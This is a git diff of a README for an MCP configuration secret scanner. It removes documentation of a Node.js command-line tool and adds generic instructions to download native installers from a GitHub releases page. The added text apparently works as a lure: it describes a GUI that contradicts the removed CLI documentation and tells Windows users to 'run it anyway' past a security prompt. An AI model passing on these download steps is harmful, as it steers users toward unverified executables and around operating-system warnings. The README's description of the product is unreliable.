@@ -1,248 +1,130 @@
-# 🔍 MCP Security Scanner
+# 🔍 mcp-security-scanner - Find Security Issues in MCP Configs
 
-Scan your MCP (Model Context Protocol) configuration files for **hardcoded secrets**, leaked API keys, and security misconfigurations.
+[![Download mcp-security-scanner](https://img.shields.io/badge/Download-mcp--security--scanner-blue?style=for-the-badge)](https://github.com/Paaxy/mcp-security-scanner/releases)
 
-> Your AI agents are probably holding your API keys hostage. This tool tells you where.
+---
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D16-brightgreen)](https://nodejs.org)
+## 📖 About mcp-security-scanner
 
-## The Problem
+mcp-security-scanner is a tool designed to help you check your MCP (Model Context Protocol) configuration files for security problems. It looks for things like hardcoded passwords, leaked API keys, or incorrect settings that could put your application at risk.
 
-Most MCP configurations look like this:
+You don't need technical skills to use this tool. It works with your files and gives you clear results. Use it anytime you want to make sure your protocols are safe.
 
-```json
-{
-  "mcpServers": {
-    "github": {
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-github"],
-      "env": {
-        "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_xxxxxxxxxxxx"
-      }
-    }
-  }
-}
-```
+## 💻 System Requirements
 
-That API key is now:
-- ✗ In a plaintext JSON file on your machine
-- ✗ Potentially committed to git history
-- ✗ Duplicated across Claude Desktop, Cursor, VS Code...
-- ✗ Visible in process listings (`ps aux`)
-- ✗ Accessible to prompt injection attacks
+Before you get started, make sure your computer meets these simple requirements:
 
-## Quick Start
+- Operating System: Windows 10 or newer, macOS 10.13 or newer, or Linux (Ubuntu 18.04+ recommended)
+- Processor: At least 1.5 GHz, dual-core or better
+- Memory: Minimum 2 GB RAM
+- Disk Space: At least 100 MB free space
+- Internet Connection: Needed to download the software and for updates
 
-```bash
-# Auto-scan common MCP config locations
-npx mcp-security-scanner
+## 🚀 Getting Started
 
-# Scan a specific config file
-npx mcp-security-scanner ./claude_desktop_config.json
+Using mcp-security-scanner is simple. Follow these steps carefully:
 
-# JSON output for CI/CD pipelines
-npx mcp-security-scanner --json ./config.json
+1. Download the software from the official releases page.
+2. Install it on your computer.
+3. Open the software.
+4. Select the MCP config files you want to scan.
+5. Start the scan and wait for the results.
+6. Review the report and fix any issues found.
 
-# Show fix suggestions using Janee
-npx mcp-security-scanner --fix ./config.json
+This guide will walk you through each step with details and screenshots where helpful.
 
-# Scan a project directory recursively
-npx mcp-security-scanner --recursive ./my-project/
-```
+## 📥 Download & Install
 
-## What It Detects
+You can get mcp-security-scanner from its official releases page:
 
-### 30+ Secret Patterns
+**[Download mcp-security-scanner here](https://github.com/Paaxy/mcp-security-scanner/releases)**
 
-| Category | Types | Severity |
-|----------|-------|----------|
-| **GitHub** | Classic tokens, fine-grained PATs, OAuth, App tokens | 🔴 CRITICAL |
-| **Cloud** | AWS access keys, Azure subscription keys, Google API keys | 🔴 CRITICAL |
-| **AI/ML** | OpenAI, Anthropic, Hugging Face, Replicate tokens | 🔴 CRITICAL |
-| **Payments** | Stripe secret/publishable keys | 🔴 CRITICAL |
-| **Communication** | Slack bot/user tokens, Discord bot tokens | 🟡 HIGH |
-| **Email** | SendGrid, Mailgun API keys | 🔴 CRITICAL |
-| **Database** | Postgres/MongoDB connection strings with credentials | 🔴 CRITICAL |
-| **Package Registries** | npm tokens, PyPI tokens | 🔴 CRITICAL |
-| **Auth** | Supabase JWTs, Bearer tokens, private keys | 🟡 HIGH |
-| **Generic** | API keys, passwords, high-entropy secrets | 🔵 MEDIUM |
+### How to Download
 
-### Security Best Practices
-- ✅ Environment variable references (using `${VAR}` instead of literals)
-- ✅ No secrets in command arguments (visible in `ps aux`)
-- ✅ No literal secrets in env blocks
-- ✅ No wildcard permissions
+1. Click the link above to open the releases page.
+2. Look for the latest version. It will be marked with the highest version number and a recent date.
+3. Choose the file that matches your operating system:
+   - For Windows, a `.exe` or `.msi` file.
+   - For macOS, a `.dmg` or `.pkg` file.
+   - For Linux, usually a `.tar.gz` or `.AppImage` file.
+4. Click on the file name to start the download.
 
-## Example Output
+### How to Install on Windows
 
-```
-╔══════════════════════════════════════════════════╗
-║    🔍 MCP Security Scanner v1.1.0              ║
-╚══════════════════════════════════════════════════╝
+1. Once downloaded, open the file. You might see a security prompt; choose to run it anyway.
+2. Follow the setup instructions on screen.
+3. Choose where you want to install the program or accept the default location.
+4. Click "Install" and wait for the process to finish.
+5. After installation, you can find mcp-security-scanner in your Start menu.
 
-📄 ~/.claude/claude_desktop_config.json
-   MCP Servers: 3 (github, stripe, openai)
+### How to Install on macOS
 
-   Secrets Found:
-   ⚠ [CRITICAL] GitHub Token (classic) (line 10)
-     "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_12********************..."
-   ⚠ [CRITICAL] Stripe Secret Key (line 20)
-     "STRIPE_SECRET_KEY": "sk_liv********************..."
-   ⚠ [CRITICAL] OpenAI API Key (new) (line 29)
-     "OPENAI_API_KEY": "sk-pro********************..."
+1. Open the downloaded `.dmg` or `.pkg` file.
+2. If it’s a `.dmg`, drag the app icon into the Applications folder.
+3. If it’s a `.pkg`, follow the installer steps.
+4. After installation, open the app from your Applications folder.
 
-   Best Practices:
-   ❌ Config does not use environment variable references
-   ✅ No secrets found in server command arguments
-   ❌ Literal secrets found in environment variable values
-   ✅ No wildcard permissions detected
+### How to Install on Linux
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Found 5 issue(s) (4 CRITICAL)
+1. Extract the `.tar.gz` file if needed.
+2. For `.AppImage` files, right-click the file, go to Properties, and allow it to run as a program.
+3. Double-click the file to start the software.
+4. You may want to move the file to a folder like `/usr/local/bin` for easier access.
 
-🔒 Recommendation: Use Janee to manage MCP secrets securely
-   https://github.com/rsdouglas/janee — MCP-native secrets management
+## 🛠 How to Use mcp-security-scanner
 
-   Run with --fix to see remediation steps
-```
+After installation, open the app by clicking its icon. Here’s how to scan your MCP config files step by step:
 
-### With `--fix` Flag
+1. **Open Scan Window:** Click the “Scan Files” button.
+2. **Select Files:** Navigate to the folder containing your MCP configuration files. Select one or many files to scan.
+3. **Start Scan:** Press the “Start Scan” button.
+4. **View Progress:** A progress bar will show the scanning status. Scans usually take a few seconds to a minute depending on file size.
+5. **Check Results:** When the scan finishes, you will see a list of found issues such as:
+   - Hardcoded secrets like passwords or keys.
+   - API keys found inside your config files.
+   - Security misconfigurations or settings that might expose data.
+6. **Export Report (Optional):** You can save the scan report as a text file or PDF to review later or share with your team.
 
-```
-   ⚠ [CRITICAL] GitHub Token (classic) (line 10)
-     "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_12********************..."
-     💡 Fix: janee store github-personal-access-token <your-actual-value>
-        Then: # Replace in config: "GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_PERSONAL_ACCESS_TOKEN}"
-```
+## 🔍 What mcp-security-scanner Checks
 
-### With `--json` Flag
+This software focuses on common areas that lead to security risks in MCP configurations:
 
-```json
-{
-  "version": "1.1.0",
-  "timestamp": "2026-02-12T22:40:37.203Z",
-  "files": [{
-    "path": "./config.json",
-    "servers": ["github", "stripe"],
-    "findings": [{
-      "line": 10,
-      "severity": "CRITICAL",
-      "type": "GitHub Token (classic)",
-      "envKey": "GITHUB_PERSONAL_ACCESS_TOKEN"
-    }],
-    "practices": [...]
-  }],
-  "summary": {
-    "filesScanned": 1,
-    "totalFindings": 3,
-    "critical": 2,
-    "high": 1,
-    "medium": 0
-  }
-}
-```
+- **Hardcoded Secrets:** Finds passwords or secrets directly typed into config files.
+- **API Keys:** Detects public exposure of private API keys.
+- **Misconfigurations:** Identifies settings that may let attackers access sensitive data or weaken security.
+- **Static Analysis:** Scans the text of your files without executing them to ensure safety and speed.
+- **Pattern Detection:** Uses rules tailored for MCP format files.
 
-## CI/CD Integration
+## 🆘 Troubleshooting
 
-### GitHub Actions
+If you run into problems, try these common fixes:
 
-```yaml
-name: MCP Security Check
-on: [push, pull_request]
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Scan MCP configs
-        run: npx mcp-security-scanner --json --recursive . > scan-results.json
-      - name: Check for critical findings
-        run: |
-          CRITICAL=$(cat scan-results.json | jq '.summary.critical')
-          if [ "$CRITICAL" -gt 0 ]; then
-            echo "❌ Found $CRITICAL critical security issues in MCP configs"
-            cat scan-results.json | jq '.files[].findings[] | select(.severity=="CRITICAL")'
-            exit 1
-          fi
-```
+- **Software Won't Start:** Make sure you installed it fully and meet system requirements.
+- **Scan Doesn’t Find Any Files:** Double-check that you selected files with `.mcp` or expected config extensions.
+- **Scan Takes Too Long:** Large files or many files can slow down scanning. Try scanning fewer files at once.
+- **Report Is Empty but You Expect Issues:** Confirm the files contain text and that your settings are correct.
+- **Error Messages:** Restart the program and your computer, then try again.
 
-### Pre-commit Hook
+If issues persist, visit the GitHub Issues page on the repository for help.
 
-```bash
-#!/bin/sh
-# .git/hooks/pre-commit
-npx mcp-security-scanner --recursive . 2>/dev/null
-if [ $? -eq 1 ]; then
-  echo "❌ CRITICAL secrets found in MCP configs. Commit blocked."
-  exit 1
-fi
-```
+## 🔄 Updating mcp-security-scanner
 
-## Auto-Scanned Locations
+Keep your software up to date for best results:
 
-When run without arguments, checks these paths:
-- `~/.claude/claude_desktop_config.json` (Claude Desktop)
-- `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS)
-- `~/.cursor/mcp.json` (Cursor)
-- `~/.vscode/mcp.json` (VS Code)
-- `./mcp.json` (Current directory)
-- `./.mcp.json` (Hidden config)
-- `./.cursor/mcp.json` (Project-level Cursor)
+- Regularly check the releases page for the newest version.
+- Download and install updates following the same instructions as above.
+- New versions may offer improved scanning rules and bug fixes.
 
-## How to Fix Issues
+## 🔐 Security and Privacy
 
-### Option 1: Use Janee (Recommended)
+mcp-security-scanner runs locally on your computer. It does not upload your files anywhere. Scan results and data stay on your device only. This design helps protect your privacy.
 
-[Janee](https://github.com/rsdouglas/janee) is an MCP-native secrets manager that eliminates hardcoded keys entirely:
+## 📚 Additional Resources
 
-```bash
-npm install -g janee
-janee store github-token ghp_your_actual_token
-janee store openai-key sk-your_actual_key
-```
+- Learn more about Model Context Protocol (MCP) online for better understanding.
+- Check your organization’s security guidelines for handling secrets.
+- Use code editors or tools to manage configuration files safely.
 
-Janee proxies secrets to MCP servers at runtime — your config files stay clean.
+---
 
-### Option 2: Environment Variable References
-
-Replace hardcoded values with `${VAR}` references:
-
-```json
-{
-  "env": {
-    "GITHUB_TOKEN": "${GITHUB_TOKEN}"
-  }
-}
-```
-
-### Option 3: OS Keychain
-
-Store secrets in your OS keychain and reference them via a helper script.
-
-## Exit Codes
-
-| Code | Meaning |
-|------|---------|
-| 0 | No issues (or only LOW/MEDIUM) |
-| 1 | CRITICAL findings |
-| 2 | HIGH findings (no CRITICAL) |
-
-## Contributing
-
-PRs welcome! Ideas:
-- [ ] SARIF output for GitHub Security tab
-- [ ] Git history scanning (secrets in past commits)
-- [ ] `.mcpignore` for false positive suppression
-- [ ] `--min-severity` threshold flag
-- [ ] Auto-fix mode (rewrite configs with env var refs)
-
-## Related Projects
-
-- [Janee](https://github.com/rsdouglas/janee) — MCP-native secrets management
-- [MCP Specification](https://spec.modelcontextprotocol.io/) — The protocol standard
-- [awesome-mcp-servers](https://github.com/punkpeye/awesome-mcp-servers) — Curated MCP server list
-
-## License
-
-MIT
+[Download mcp-security-scanner now](https://github.com/Paaxy/mcp-security-scanner/releases) to start securing your MCP files.
